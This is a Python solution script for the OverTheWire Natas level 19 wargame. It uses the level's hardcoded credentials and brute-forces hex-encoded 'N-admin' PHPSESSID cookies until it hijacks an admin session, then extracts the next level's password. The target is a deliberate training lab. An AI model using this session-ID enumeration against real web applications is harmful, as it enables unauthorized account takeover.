import natas, requests, re
USER = 'natas19'
PASS = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
burp = {"http": "http://127.0.0.1:8080"}

session = requests.Session()

def myhex2bin(h):
    if not isinstance(h, str):
        return None
    r = ''
    for i in range(0, len(h), 2):
        r += chr(int(h[i:i+2], 16))
    return r

def bin2hex(s):
    if not isinstance(s, str):
        return None
    return ''.join([format(ord(c), '02x') for c in s])

result = bin2hex("123-admin")
    
for id in range(0, 641):
    request = session.get(url=URL, auth=auth_basic, cookies={"PHPSESSID": str(bin2hex(f"{id}-admin"))}, headers=header, proxies=burp)
    response_http = request.text
    def flag():
        flag_regex = re.findall('([0-9a-zA-Z]{32})', response_http)
        return flag_regex[0 if len(flag_regex) == 1 else 1]
    if 'You are an admin' in response_http:
        print("The credentials for the natas20 are:\nusername: natas20\npassword:", flag())
        break